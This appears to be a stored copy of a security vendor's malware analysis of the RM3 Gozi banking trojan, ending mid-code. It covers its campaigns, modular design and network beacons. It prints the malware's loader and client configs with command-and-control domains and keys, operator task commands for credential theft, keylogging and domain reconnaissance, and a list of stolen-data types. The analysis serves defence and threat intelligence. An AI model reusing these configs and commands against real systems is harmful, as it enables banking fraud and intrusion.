{
    "id": "353246e2-edc6-4f7a-a1fb-0443fbf448e4",
    "created_at": "2023-01-12T15:00:08.137707Z",
    "updated_at": "2025-03-27T02:15:35.61423Z",
    "deleted_at": null,
    "sha1_hash": "ff562e506a915909c41a9d511fd9890f108a02d2",
    "title": "2021-05-04 - RM3 – Curiosities of the wildest banking malware",
    "authors": "",
    "file_creation_date": "2022-05-28T01:21:08Z",
    "file_modification_date": "2022-05-28T01:21:08Z",
    "file_size": 1534388,
    "plain_text": "# RM3 – Curiosities of the wildest banking malware\n\n**[research.nccgroup.com/2021/05/04/rm3-curiosities-of-the-wildest-banking-malware/](https://research.nccgroup.com/2021/05/04/rm3-curiosities-of-the-wildest-banking-malware/)**\n\nby **_[fumik0_ & the RIFT](https://twitter.com/fumik0_)_**\n\n## TL:DR\n\n\nMay 4, 2021\n\n\nOur Research and Intelligence Fusion Team have been tracking the Gozi variant RM3 for\nclose to 30 months. In this post we provide some history, analysis and observations on this\nmost pernicious family of banking malware targeting Oceania, the UK, Germany and Italy.\n\nWe’ll start with an overview of its origins and current operations before providing a\ndeep dive technical analysis of the RM3 variant.\n\n## Introduction\n\nDespite its long and rich history in the cyber-criminal underworld, the Gozi malware family is\nsurrounded with mystery and confusion. The leaking of its source code only increased this\nconfusion as it led to an influx of Gozi variants across the threat landscape.\n\nAlthough most variants were only short-lived – they either disappeared or were taken down\nby law enforcement – a few have had greater staying power.\n\nSince September 2019, Fox-IT/NCC Group has intensified its research\ninto known active Gozi variants. These are operated by a variety of threat actors (TAs) and\ngenerally cause financial losses by either direct involvement in transactional fraud, or by\n\n\n-----\n\nfacilitating other types of malicious activity, such as targeted ransomware activity.\n\n**Gozi ISFB started targeting financial institutions around 2013-2015 and hasn’t stopped since**\nthen. It is one of the few – perhaps the only – main active branches of the notorious 15 year\nold Gozi / CRM. Its popularity is probably due to the wide range of variants which are\navailable and the way threat actor groups can use these for their own goals.\n\nIn 2017, yet another new version was detected in the wild with a number of major\nmodifications compared to the previous main variant:\n\nRebranded RM loader (called RM3)\nUsed exotic PE file format exclusively designed for this banking malware\nModular architecture\nNetwork communication reworked\nNew modules\n\nGiven the complex development history of the Gozi ISFB forks, it is difficult to say with any\ncertainty which variant was used as the basis for RM3. This is further complicated by the\nmany different names used by the Cyber Threat Intelligence and Anti-Virus industries for this\nfamily of malware. But if you would like to understand the rather tortured history of this\n[particular malware a little better, the research and blog posts on the subject by Check Point](https://research.checkpoint.com/2020/gozi-the-malware-with-a-thousand-faces/)\nare a good starting point.\n\n## Banking malware targeting mainly Europe & Oceania\n\nWith more than four years of activity, RM3 has had a significant impact on the financial fraud\nlandscape by spreading a colossal number of campaigns, principally across two regions:\n\n**_Oceania, to date, Australia and New Zealand are the most impacted countries in this_**\nregion. Threat actors seemed to have significant experience and used traditional\nmeans to conduct fraud and theft, mainly using web injects to push fakes or replacers\ndirectly into financial websites. Some of these injectors are more advanced than the\nusual ones that could be seen in bankers, and suggest the operators behind them were\nmore sophisticated and experienced.\n**_Europe, targeting primarily the UK, Germany and Italy. In this region, a manual fraud_**\nstrategy was generally followed which was drastically different to the approach seen in\nOceania.\n\n\n-----\n\n_Two different approaches to fraud used in Europe and Oceania_\n\n_It’s worth noting that ‘Elite’ in this context means highly skilled operators. The injects_\n_provided and the C&C servers are by far the most complicated and restricted ones seen up_\n_to this date in the fraud landscape._\n\nFox-IT/NCC Group has currently counted at least eight* RM3 infrastructures:\n\n4 in Europe\n2 in Oceania (that seem to be linked together based on the fact that they share the\nsame inject configurations)\n1 worldwide (using AES-encryption)\n1 unknown\n\nLooking back, 2019 seems to have been a golden age (at least from the malware operators’\nperspective), with five operators active at the same time. This golden age came to a sudden\nend with a sharp decline in 2020.\n\n\n-----\n\n_RM3 timeline of active campaigns seen in the wild_\nEven when some RM3 controllers were not delivering any new campaigns, they were still\nmanaging their bots by pushing occasional updates and inspecting them carefully. Then,\nafter a number of weeks, they start performing fraud on the most interesting targets. This is\nan extremely common pattern among bank malware operators in our experience, although\nthe reasons for this pattern remain unclear. It may be a tactic related to maintaining stealth or\nit may simply be an indication of the operators lagging behind the sheer number of infections.\n\nThe global pandemic has had a noticeable impact on many types of RM3 infrastructure, as it\nhas on all malware as a service (MaaS) operations. The widespread lockdowns as a result of\nthe pandemic have resulted in a massive number of bots being shut down as companies\nclosed and users were forced to work from home, in some cases using personal computers.\nThis change in working patterns could be an explanation for what happened between Q1 &\nQ3 2020, when campaigns were drastically more aggressive than usual and bot infections\nintensified (and were also of lower quality, as if it was an emergency). The style of this\noperation differed drastically from the way in which RM3 operated between 2018 and 2019,\n[when there was a partnership with a distributor actor called Sagrid.](https://twitter.com/kafeine/status/1233407086324781058)\n\nAnalysis of the separate campaigns reveals that individual campaign infrastructures are\nindependent from each of the others and operate their own strategies:\n\n**RM3 Infra** **Tasks** **Injects †**\n\n**Financial** **VNC** **SOCKS**\n\nUK 1 No‡ Yes Yes Yes\n\nUK 2 Yes No No No\n\nItaly No‡ Yes Yes Yes\n\nAustralia/NZ 1 Yes Yes No‡ No\n\n\n-----\n\n**RM3 Infra** **Tasks** **Injects †**\n\nAustralia/NZ 2 Yes Yes No‡ No\n\nRM3 .at ??? ??? ??? ???\n\nGermany ??? ??? ??? ???\n\nWorldwide Yes No No No\n\n**† Based on the web inject configuration file from config.bin**\n\n‡ Based on active campaign monitoring, threat actor team(s) are mainly inspecting bots to\n_manually push extra commands like VNC module for starting fraud activities._\n\n## A robust and stable distribution routine\n\nAs with many malware processes, renewing bots is not a simple, linear thing and many\nelements have to be taken into consideration:\n\nMalware signatures\nPacker evading AV/EDR\nDistribution used (ratio effectiveness)\nTime of an active campaign before being takedown by abuse\n\nMany channels have been used to spread this malware, with distribution by spam (malspam)\nthe most popular – and also the most effective. Multiple distribution teams are behind these\ncampaigns and it is difficult to identify all of them; particularly so now, given the increased\nprofessionalisation of these operations (which now can involve shorter term, contractor like\nrelationships). As a result, while malware campaign infrastructures are separate, there is\nnow more overlap between the various infrastructures. It is certain however that one actor\nknown as Sagrid was definitely the most prolific distributor. Around 2018/2019, Sagrid\nactively spread malware in Australia and New Zealand, using advanced techniques to deliver\nit to their victims.\n\n\n-----\n\n_RM3 distribution over the past 4 years_\nThe graphic below shows the distribution method of an individual piece of RM3 malware in\nmore detail.\n\n_A simplified path of a payload from its compilation to its delivery_\nInterestingly, the only exploit kit seen to be involved in the distribution of RM3 has been\n**Spelevo – at least in our experience. These days, Exploit Kits (EK) are not as active as in**\ntheir golden era in the 2010s (when Angler EK dominated the market along with Rig and\n\n\n-----\n\n**Magnitude). But they are still an interesting and effective technique for gathering bots from**\ncorporate networks, where updates are complicated and so can be delayed or just not\nperformed. In other words, if a new bot is deployed using an EK, there is a higher chance\nthat it is part of big network than one distributed by a more ‘classic’ malspam campaign.\n\nStrangely, to this date, RM3 has never been observed targeting financial institutions in North\nAmerica. Perhaps there are just no malicious actors who want to be part of this particular\nmule ecosystem in that zone. Or perhaps all the malicious actors in this region are still\nmaking enough money from older strains or another banking malware.\n\nNowadays, there is a steady decline in banking malware in general, with most TAs joining the\nrising and explosive ransomware trend. It is more lucrative for bank malware gangs to stop\ntheir usual business and try to get some exclusive contracts with the ransom teams. The\nreturn on investment (ROI) of a ransom paid by a victim is significantly higher than for the\nwhole classic money mule infrastructure. The cost and time required in money mule and\ninject operations are much more complex than just giving access to an affiliate and awaiting\nroyalties.\n\n## Large number of financial institutions targeted\n\nFox-IT/NCC Group has identified more than 130 financial institution targeted by threat actor\ngroups using this banking malware. As the table below shows, the scope and impact of these\nattacks is particularly concentrated on Oceania. This is also the only zone where loan and\njob websites are targeted. Of course, targeting job websites provides them with further\nopportunities to hire money mules more easily within their existing systems.\n\n**Country** **Banks** **Web Shops** **Job Offers** **Loans** **Crypto Services**\n\nUK 28 1 0 0 0\n\nIT 17 0 0 0 0\n\nAU/NZ 80~ 0 2 2 6\n\nA short timeline of post-pandemic changes\n\nAs we’ve already said, the pandemic has had an impact across the entire fraud landscape\nand forced many TAs (not just those using RM3) to drastically change their working methods.\nIn some cases, they have shut down completely in one field and started doing something\nelse. For RM3 TAs, as for all of us, these are indeed interesting times.\n\n### Q3 2019 – Q2 2020, Classic fraud era\n\n\n-----\n\nBefore the pandemic, the tasks pushed by RM3 were pretty standard when a bot was part of\nthe infrastructure. The example below is a basic check for a legitimate corporate bot with an\nopen access point for a threat actor to connect to and start to use for fraud.\n```\nGET_CREDS\nGET_SYSINFO\nLOAD_MODULE=mail.dll,UXA\nLOAD_KEYLOG=*\nLOAD_SOCKS=XXX.XXX.XXX.XXX:XXXX\n\n```\nOtherwise, the banking malware was configured as an advanced infostealer, designed to\nsteal data and intercept all keyboard interactions.\n```\nGET_CREDS\nLOAD_MODULE=mail.dll,UXA\nLOAD_KEYLOG=*\n\n### Q4 2020 – Now, Bot Harvesting Era\n\n```\nNowadays, bots are basically removed if they are coming from old infrastructures, if they are\nnot part of an active campaign. It’s an easy way for them for removing researcher bots\n```\nDEL_CONFIG\n\n```\nOtherwise, this is a classic information gathering system operation on the host and network.\nWhich indicates TAs are following the ransomware path and declining their fraud legacy step\nby step.\n```\nGET_SYSINFO\nRUN_CMD=net group \"domain computers\" /domain\nRUN_CMD=net session\n\n## RM3 Configs – Invaluable threat intelligence data\n\n### RM3.AT\n\n```\nAround the summer of 2019, when this banking malware was at its height, an infrastructure\nwhich was very different from the standard ones first emerged. It mostly used infostealers for\ndistribution and pushed an interesting variant of the RM3 loader.\n\nBased on configs, similarities with the GoziAT TAs were seen. The crossovers were:\n\nboth infrastructure are using the .at TLD\nsubdomains and domains are using the same naming convention\nServer ID is also different from the default one (12)\nDefault nameservers config\nFirst seen when GoziAT was curiously quiet\n\n\n-----\n\nAn example loader.ini file for RM3.at is shown below:\n```\nLOADER.INI - RM3 .AT example\n{\n  \"HOSTS\": [\n    \"api.fiho.at\",\n    \"t2.fiho.at\"\n  ],\n  \"NAMESERVERS\": [\n    \"172.104.136.243\",\n    \"8.8.4.4\",\n    \"192.71.245.208\",\n    \"51.15.98.97\",\n    \"193.183.98.66\",\n    \"8.8.8.8\"\n  ],\n  \"URI\": \"index.htm\",\n  \"GROUP\": \"3000\",\n  \"SERVER\": \"350\",\n  \"SERVERKEY\": \"s2olwVg5cU7fWsec\",\n  \"IDLEPERIOD\": \"10\",\n  \"LOADPERIOD\": \"10\",\n  \"HOSTKEEPTIMEOUT\": \"60\",\n  \"DGATEMPLATE\": \"constitution.org/usdeclar.txt\",\n  \"DGAZONES\": [\n    \"com\",\n    \"ru\",\n    \"org\"\n  ],\n  \"DGATEMPHASH\": \"0x4eb7d2ca\",\n  \"DGAPERIOD\": \"10\"\n}\n\n```\nAs a reminder, the ISFB v2 variant called GoziAT (which technically uses the RM2 loader)\nuses the format shown below:\n```\nLOADER.INI - GoziAT/ISFB (RM2 Loader)\n{\n  \"HOSTS\": [\n    \"api10.laptok.at/api1\",\n    \"golang.feel500.at/api1\",\n    \"go.in100k.at/api1\"\n  ],\n  \"GROUP\": \"1100\",\n  \"SERVER\": \"730\",\n  \"SERVERKEY\": \"F2oareSbPhCq2ch0\",\n  \"IDLEPERIOD\": \"10\",\n  \"LOADPERIOD\": \"20\",\n  \"HOSTSHIFTTIMEOUT\": \"1\"\n}\n\n```\n\n-----\n\nBut this RM3 infrastructure disappeared just a few weeks later and has never been seen\nagain. It is not known if the TAs were satisfied with the product and its results and it remains\none of the unexplained curiosities of this banking malware\n\nBut, we can say this marked the return of GoziAT, which was back on track with intense\ncampaigns.\n\nOther domains related to this short lived RM3 infrastructure were.\n\napi.fiho.at\ny1.rexa.at\ncde.frame303.at\napi.frame303.at\nu2.inmax.at\ncdn5.inmax.at\ngo.maso.at\nf1.maso.at\n\n### Standard routine for other infrastructures\n\nMeanwhile, a classic loader config will mostly need standard data like any other malware:\n\nC&C domains (called hosts on the loader side)\nTimeout values\nKeys\n\nThe example below shows a typical loader.ini file from a more ‘classic’ infrastructure. This\noneis from Germany, but similar configurations were seen in the UK1, Australia/New\nZealand1 and Italian infrastructures:\n\n\n-----\n\n```\nLOADER.INI DE\n{\n  \"HOSTS\": \"https://daycareforyou.xyz\",\n  \"ADNSONLY\": \"0\",\n  \"URI\": \"index.htm\",\n  \"GROUP\": \"40000\",\n  \"SERVER\": \"12\",\n  \"SERVERKEY\": \"z2Ptfc0edLyV4Qxo\",\n  \"IDLEPERIOD\": \"10\",\n  \"LOADPERIOD\": \"10\",\n  \"HOSTKEEPTIMEOUT\": \"60\",\n  \"DGATEMPLATE\": \"constitution.org/usdeclar.txt\",\n  \"DGAZONES\": [\n    \"com\",\n    \"ru\",\n    \"org\"\n  ],\n  \"DGATEMPHASH\": \"0x4eb7d2ca\",\n  \"DGAPERIOD\": \"10\"\n}\n\n```\nUpdates to RM3 were observed to be ongoing, and more fields have appeared since the\n**_3009XX builds (e.g: 300912, 900932):_**\n\nConfiguring the self-removing process\nSetup the loader module as the persistent one\nThe Anti-CIS (langid field) is also making a comeback\n\nThe example below shows a typical client.ini file as seen in build 3009xx from the UK2 and\nAustralia/New Zealand 2 infrastructures:\n\n\n-----\n\n```\nCLIENT.INI\n{\n  \"HOSTS\": \"https://vilecorbeanca.xyz\",\n  \"ADNSONLY\": \"0\",\n  \"URI\": \"index.htm\",\n  \"GROUP\": \"92020291\",\n  \"SERVER\": \"12\",\n  \"SERVERKEY\": \"kD9eVTdi6lgpH0Ml\",\n  \"IDLEPERIOD\": \"10\",\n  \"LOADPERIOD\": \"10\",\n  \"HOSTKEEPTIMEOUT\": \"60\",\n  \"NOSCRIPT\": \"0\",\n  \"NODELETE\": \"0\",\n  \"NOPERSISTLOADER\": \"0\",\n  \"LANGID\": \"RU\",\n  \"DGATEMPLATE\": \"constitution.org/usdeclar.txt\",\n  \"DGATEMPHASH\": \"0x4eb7d2ca\",\n  \"DGAZONES\": [\n    \"com\",\n    \"ru\",\n    \"org\"\n  ],\n  \"DGAPERIOD\": \"10\"\n}\n\n```\nThe client.ini file mainly stores elements that will be required for the explorer.dll module:\n\nTimeouts values\nMaximum size allowed for RM3 requests to the controllers\nVideo config\nHTTP proxy activation\n\n\n-----\n\n```\nCLIENT.INI Default Format\n{\n  \"CONTROLLER\": [\n    \"\",\n  ],\n  \"ADNSONLY\": \"0\",\n  \"IPRESOLVERS\": \"curlmyip.net\",\n  \"SERVER\": \"12\",\n  \"SERVERKEY\": \"\",\n  \"IDLEPERIOD\": \"300\",\n  \"TASKTIMEOUT\": \"300\",\n  \"CONFIGTIMEOUT\": \"300\",\n  \"INITIMEOUT\": \"300\",\n  \"SENDTIMEOUT\": \"300\",\n  \"GROUP\": \"\",\n  \"HOSTKEEPTIMEOUT\": \"60\",\n  \"HOSTSHIFTTIMEOUT\": \"60\",\n  \"RUNCHECKTIMEOUT\": \"10\",\n  \"REMOVECSP\": \"0\",\n  \"LOGHTTP\": \"0\",\n  \"CLEARCACHE\": \"1\",\n  \"CACHECONTROL\": [\n    \"no-cache,\",\n    \"no-store,\",\n    \"must-revalidate\"\n  ],\n  \"MAXPOSTLENGTH\": \"300000\",\n  \"SETVIDEO\": [\n    \"30,\",\n    \"8,\",\n    \"notipda\"\n  ],\n  \"HTTPCONNECTTIME\": \"480\",\n  \"HTTPSENDTIME\": \"240\",\n  \"HTTPRECEIVETIME\": \"240\"\n}\n\n## What next?\n\n```\nActive monitoring of current in-the-wild instances suggests that the RM3 TAs are\nprogressively switching to the ransomware path. That is, they have not pushed any updates\non the fraud side of their operations for a number of months (by not pushing any injects), but\nthey are still maintaining their C&C infrastructure. All infrastructure has a cost and the fact\nthey are maintaining their C&C infrastructure without executing traditional fraud is a strong\nindication they are changing their strategy to another source of income.\n\nThe tasks which are being pushed (and old ones since May 2020) are triage steps for\nselecting bots which could be used for internal lateral movement. This pattern of behaviour is\nbecoming more evident everyday in the latest ongoing campaigns, where everyone seems to\nbe targeted and the inject configurations have been totally removed.\n\n\n-----\n\nAs a reminder, over the past two years banking malware gangs in general have been seen to\nfollow this trend. This is due to the declining fraud ecosystem in general, but also due to the\nincreased difficulty in finding inject developers with the skills to develop effective fakes which\nthis decline has also prompted.\n\n_How banking TAs can migrate from fraud to ransom (or any other businesses)_\nWe consider RM3 to be the most advanced ISFB strain to date, and fraud tools can easily be\nswitched into a malicious red team like strategy.\n\n\n-----\n\n_RM3 evolving to support two different use cases at the same time_\n\n## Why is RM3 the most advanced ISFB strain?\n\nAs we said, we consider RM3 to be the most advanced ISFB variant we have seen. When\nwe analyse the RM3 payload, there is a huge gap between it and its predecessors. There\nare multiple differences:\n\nA new PE format called PX has been developed\nThe .bss section is slightly updated for storing RM3 static variables\nA new structure called WD based on the J1/J2/J3/JJ ISFB File Join system for storing\n**_files_**\n\n\n-----\n\n_Architecture differences between ISFB v2 and RM3 payload_\n\n_(main sections discussed below)_\n\n## PX Format\n\nAs mentioned, RM3 is designed to work with PX payloads (Portable eXecutable). This is an\nexotic file format created for, and only used with, this banking malware. The structure is not\nvery different from the original PE format, with almost all sections, data directories and\nsection tables remaining intact. Essentially, use of the new file format just requires malware\nto be re-crafted correctly in a new payload at the correct offset.\n\n_PX Header_\n\n## BSS section\n\n\n-----\n\nThe bss section (Block Starting Symbol) is a critical data segment used by all strains of ISFB\nfor storing uninitiated static local variables. These variables are encrypted and used for\ndifferent interactions depending on the module in use.\n\nIn a compiled payload, this section is usually named “.bss0”. But evidence from a source\ncode leak shows that this is originally named “.bss” in the source code. These comments\nalso make it clear that this module is encrypted.\n\n_The encrypted .bss section_\nThis is illustrated by the source code comments shown below:\n```\n// Original section name that will be created within a file\n#define CS_SECTION_NAME \".bss0\"\n// The section will be renamed after the encryption completes.\n// This is because we cannot use reserved section names aka \".rdata\" or \".bss\" during\ncompile time.\n#define CS_NEW_SECTION_NAME \".bss\"\n\n```\nWhen working with ISFB, it is common to see the same mechanism or routine across\nmultiple compiled builds or variants. However, it is still necessary to analyse them all in detail\nbecause slight adjustments are frequently introduced. Understanding these minor changes\ncan help with troubleshooting and explain why scripts don’t work. The decryption routine in\nthe bss section is a perfect example of this; it is almost identical to ISFB v2 variants, but the\n**RM3 developers decided to tweak it just slightly by creating an XOR key in a different way –**\n[adding a FILE_HEADER.TimeDateStamp with the gs_Cookie (this information based on](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header)\nthe ISFB leak).\n\n\n-----\n\n_Decrypted strings from the .bss section being parsed by IDA_\nOccasionally, it is possible to see a debugged and compiled version of RM3 in the wild. It is\nunknown if this behaviour is intended for some reason or simply a mistake by TA teams, but\nit is a gold mine for understanding more about the underlying code.\n\n## WD Struct\n\n**ISFB has its own way of storing and using embedded files. It uses a homemade structure**\nthat seems to change its name whenever there is a new strain or a major ISFB update:\n\nFJ or J1 – Old ISFB era\nJ2 – Dreambot\nJ3 – ISFB v3 (Only seen in Japan)\nJJ – ISFB v2 (v2.14+ – now)\nWD – RM3 / Saigon\n\nTo get a better understanding of the latest structure in use, it is worth taking a quick look\nback at the active strains of ISFB v2 still known to use the JJ system.\n\nThe structure is pretty rudimentary and can be summarised like this:\n```\nstruct JJ_Struct {\n DWORD xor_cookie;\n DWORD crc32;\n DWORD size;\n DWORD addr;\n} JJ;\n\n```\nWith RM3, they decided to slightly rework the join file philosophy by creating a new structure\ncalled WD. This is basically just a rebranded concept; it just adds the JJ structure (seen\nabove) and stores it as a pointer array.\n\n\n-----\n\nThe structure itself is really simple:\n```\nstruct WD_Struct {\n DWORD size;\n WORD magic;\n WORD flag;\n JJ_Struct *jj;\n} WD;\n\n```\nIn allRM3 builds, these structures simply direct the malware to grab an average of at least 4\nfiles†:\n\nA PX loader\nAn RSA pubkey\nAn RM3 config\nA wordlist that will be mainly used for create subkeys in the registry\n\n† The amount of files is dependent on the loader stage or RM3 modules used. It is also\nbased on the ISFB variant, as another file could be present which stores the langid value\n(which is basically the anti-cis feature for this banking malware).\n\n## Architecture\n\nEvery major ISFB variant has something that makes it unique in some way. For example, the\nnotorious Dreambot was designed to work as a standalone payload; the whole loader stage\nwalk-through was removed and bots were directly pointed at the correct controllers. This\nchoice was mainly explained by the fact that this strain was designed to work as malware as\na service. It is fairly standard right now to see malware developers developing specific\nfeatures for TAs – if they are prepared to pay for them. In these agreements, TAs can be\nguaranteed some kind of exclusivity with a variant or feature. However, this business model\ndoes also increase the risk of misunderstanding and overlap in term of assigning ownership\nand responsibility. This is one of the reasons it is harder to get a clear picture of the activities\nhappening between malware developers & TAs nowadays.\n\nBut to get back to the variant we are discussing here; RM3 pushed the ISFB modular plugin\nsystem to its maximum potential by introducing a range of elements into new modules that\nhad never been seen before. These new modules included:\n\nbl.dll\nexplorer.dll\nrt.dll\n\n\n-----\n\nnetwrk.dll\n\nThese modules are linked together to recreate a modded client32.bin/client64.bin (modded\nfrom the client.bin seen in ISFB v2). This new architecture is much more complicated to\ndebug or disassemble. In the end, however, we can split this malware into 4 main branches:\n\nA modded client32.bin/client64.bin\nA browser module designed to setup hooks and an SSL proxy (used for POST\nHTTP/HTTPS interception)\nA remote shell (probably designed for initial assessments before starting lateral\nattacks)\nA fraud arsenal toolkit (hidden VNC, SOCKs proxy, etc…)\n\n_RM3 Architecture_\n\n\n-----\n\n## RM3 Loader – Major ISFB update? Or just a refactored code?\n\nThe loader is a minimalist plugin that contains only the required functions for doing three\nmain tasks:\n\nContacting a loader C&C (which is called host), downloading critical RM3 modules and\nstoring them into the registry (bl.dll, explorer.dll, rt.dll, netwrk.dll)\nSetting up persistence†\nRebooting everything and making sure it has removed itself†.\n\n_An overview of the second stage loader_\nThese functions are summarised in the following schematic.‡\n\n† In the 3009XX build above, a TA can decide to setup the loader as persistent itself, or\nremove the payload.\n\n‡ Of course, the loader has more details than could be mentioned here, but the schematic\nshows the main concepts for a basic understanding.\n\n## RM3 Network beacons – Hiding the beast behind simple URIs\n\nC&C beacon requests have been adjusted from the standard ISFB v2 ones, by simplifying\nthe process with just two default URI. These URIs are dynamic fields that can be configured\nfrom the loader and client config. This is something that older strains are starting to follow\nsince build 250172.\n\nWhen it switches to the controller side, RM3 saves HTTPS POST requests performed by the\nusers. These are then used to create fake but legitimate looking paths.\n\n\n-----\n\n_Changing RM3 URI path dynamically_\nThis ingenious trick makes RM3 really hard to catch behind the telemetry generated by the\nbot. To make short, whenever the user is browsing websites performing those specific\nrequests, the malware is mimicking them by replacing the domain with the controller one.\n```\nhttps://<controler_domain>.tld/index.html        <- default\nhttps://<controler_domain>.tld/search/wp-content/app   <- timer cycle #1\nhttps://<controler_domain>.tld/search/wp-content/app\nhttps://<controler_domain>.tld/search/wp-content/app\nhttps://<controler_domain>.tld/search/wp-content/app\nhttps://<controler_domain>.tld/admin/credentials/home  <- timer cycle #2\nhttps://<controler_domain>.tld/admin/credentials/home\nhttps://<controler_domain>.tld/admin/credentials/home\nhttps://<controler_domain>.tld/admin/credentials/home\nhttps://<controler_domain>.tld/operating/static/template/index.php <- timer cycle #3\nhttps://<controler_domain>.tld/operating/static/template/index.php\nhttps://<controler_domain>.tld/operating/static/template/index.php\nhttps://<controler_domain>.tld/operating/static/template/index.php\n\n```\nIf that wasn’t enough, the usual base64 beacons are now hidden as a data form and send by\nmeans of POST requests. When decrypted, these requests reveal this typical network\ncommunication.\n```\nrandom=rdm&type=1&soft=3&version=300960&user=17fe7d78280730e52b545792f07d61cb&group=21\n\n```\nThe fields can be explained in as follows:\n\n**Field** **Meaning**\n\nrandom A mandatory randomised value\n\ntype Data format\n\nsoft Network communication method\n\nversion Build of the RM3 banking malware\n\nuser User seed\n\ngroup Campaign ID\n\nid RM3 Data type\n\narc Module with specific architecture (0 = i386 – 1= 86_x64)\n\nsize Stolen data size\n\n\n-----\n\n**Field** **Meaning**\n\nuptime Bot uptime\n\nsysid Machine seed\n\nos Windows version\n\nSoft – A curious ISFB Field\n\n\n**Response Format**\n\n**(< Build 300960)**\n\n\n**Response**\n**Format**\n\n**(Build 300960)**\n\nBase64(RSA +\nAES)\n\nBase64(RSA +\nAES)\n\n\n**Value** **Stage C&C**\n\n3 Host\n(Loader)\n\n2 Host\n(Loader)\n\n\n**Network**\n**Communication**\n\n\nWinAPI Base64(RSA +\nSerpent)\n\nCOM Base64(RSA +\nSerpent)\n\n\n1 Controller WinAPI/COM RSA + Serpent RSA + AES\n\nID – A field being updated RM3\n\n[Thanks to the source code leak, identifying the data type is not that complicated and can be](https://github.com/gbrindisi/malware/blob/master/windows/gozi-isfb/dname.txt)\ndetermined from the field “id”\n```\nБот отправляет на сервер файлы следующего типа и формата (тип данных задаётся\nпараметром type в POST-запросе):\nSEND_ID_UNKNOWN 0 - неизвестно, используется только для тестирования\nSEND_ID_FORM 1 - данные HTML-форм. ASCII-заголовок + форма бинарном виде,\nкак есть\nSEND_ID_FILE 2 - любой файл, так шлются найденные по маске файлы\nSEND_ID_AUTH 3 - данные IE Basic Authentication, ASCII-заголовок + бинарные\nданные\nSEND_ID_CERTS 4 - сертификаты. Файлы PFX упакованые в CAB или ZIP.\nSEND_ID_COOKIES 5 - куки и SOL-файлы. Шлются со структурой каталогов. Упакованы\nв CAB или ZIP\nSEND_ID_SYSINFO 6 - информация о системе. UTF8(16)-файл, упакованый в CAB или\nZIP\nSEND_ID_SCRSHOT 7 - скриншот. GIF-файл.\nSEND_ID_LOG 8 - внутренний лог бота. TXT-файл.\nSEND_ID_FTP 9 - инфа с грабера FTP. TXT-файл.\nSEND_ID_IM 10 - инфа с грабера IM. TXT-файл.\nSEND_ID_KEYLOG 11 - лог клавиатуры. TXT-файл.\nSEND_ID_PAGE_REP 12 - нотификация о полной подмене страницы TXT-файл.\nSEND_ID_GRAB 13 - сграбленый фрагмент контента. ASCII заголовок + контент,\nкак он есть\n\n```\nOver time, they have created more fields:\n\n\n-----\n\n**New Command** **ID** **Description**\n\nSEND_ID_CMD 19 Results from the CMD_RUN command\n\nSEND_ID_??? 20 –\n\nSEND_ID_CRASH 21 Crash dump\n\nSEND_ID_HTTP 22 Send HTTP Logs\n\nSEND_ID_ACC 23 Send credentials\n\nSEND_ID_ANTIVIRUS 24 Send Antivirus info\n\nModule list\n\nAnalysis indicates that any RM3 instance would have to include at least the following\nmodules:\n\n\n**CRC** **Module Name**\n\n\n**PE**\n**Format** **Stage** **Description**\n\n\n– – MZ – 1st stage RM3 loader\n\n0xc535d8bf loader.dll PX – 2nd stage RM3 loader\n\n– – MZ – RM3 Startup module hidden in\nthe shellcode\n\n0x8576b0d0 bl.dll PX Host RM3 Background Loader\n\n0x224c6c42 explorer.dll PX Host RM3 Mastermind\n\n0xd6306e08 rt.dll PX Host RM3 Runtime DLL – RM3\nWinAPI/COM Module\n\n0x45a0fcd0 netwrk.dll PX Host RM3 Network API\n\n0xe6954637 browser.dll PX Controller Browser Grabber/HTTPS\nInterception\n\n0x5f92dac2 iexplore.dll PX Controller Internet explorer Hooking\nmodule\n\n0x309d98ff firefox.dll PX Controller Firefox Hooking module\n\n0x309d98ff microsoftedgecp.dll PX Controller Microsoft Edge Hooking\nmodule (old one)\n\n0x9eff4536 chrome.dll PX Controller Google chrome Hooking\nmodule\n\n\n-----\n\n**CRC** **Module Name**\n\n\n**PE**\n**Format** **Stage** **Description**\n\n\n0x7b41e687 msedge.dll PX Controller Microsoft Edge Hooking\nmodule (Chromium one)\n\n0x27ed1635 keylog.dll PX Controller Keylogging module\n\n0x6bb59728 mail.dll PX Controller Mail Grabber module\n\n0x1c4f452a vnc.dll PX Controller VNC module\n\n0x970a7584 sqlite.dll PX Controller SQLITE Library required for\nsome module\n\n0xfe9c154b ftp.dll PX Controller FTP module\n\n0xd9839650 socks.dll PX Controller Socks module\n\n0x1f8fde6b cmdshell.dll PX Controller Persistent remote shell module\n\nAdditionally, more configuration files ( .ini ) are used to store all the critical information\nimplemented in RM3. Four different files are currently known:\n\n**CRC** **Name**\n\n0x8fb1dde1 loader.ini\n\n0x68c8691c explorer.ini\n\n0xd722afcb client.ini†\n\n0x68c8691c vnc.ini\n\n_† CLIENT.INI is never intended to be seen in an RM3 binary, as it is intended to be received_\n_by the loader C&C (aka “the host”, based on its field name on configs). This is completely_\n_different from older ISFB strains, where the client.ini is stored in the client32.bin/client64.bin._\n_So it means, if the loader c&c is offline, there is no option to get this crucial file_\n\n_Moving this file is a clever move by the RM3 malware developers and the TAs using it as_\n_they have reduced the risk of having researcher bots in their ecosystem._\n\n## RM3 dependency madness\n\nWith client32.bin (from the more standard ISFB v2 form) technically not present itself but\ninstead implemented as an accumulation of modules injected into a process, RM3 is\ndrastically different from its predecessors. It has totally changed its micro-ecosystem by\nforcing all of its modules to interact with each other (except bl.dll) and as shown below.\n\n\n-----\n\n_All interactions between RM3 modules_\nThese changes also slow down any in-depth analysis, as they make it way harder to analyse\nas a standalone module.\n\n_External calls from other RM3 modules (8576b0d0 and e695437)_\n\n## RM3 Module 101\n\nThanks to the startup module launched by start.ps1 in the registry, a hidden shell worker is\nplugged into explorer.exe (not the explorer.dll module) that initialises a hooking instance for\nspecific WinAPI/COM calls. This allows the banking malware to inject all its components into\nevery child process coming from that Windows process. This strategy permits RM3 to have\ntotal control of all user interactions.\n\n\n-----\n\n_(*) PoV = Point of View_\n\nLooking at DllMain, the code hasn’t changed that much in the years since the ISFB leak.\n```\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n BOOL Ret = TRUE;\n WINERROR Status = NO_ERROR;\n Ret = 1;\n if ( ul_reason_for_call ) {\n  if ( ul_reason_for_call == 1 && _InterlockedIncrement(&g_AttachCount) == 1 ) {\n   Status = ModuleStartup(hModule, lpReserved); // <- Main call\n   if ( Status ) {\n    SetLastError(Status);\n    Ret = 0;\n   }\n  }\n }\n else if ( 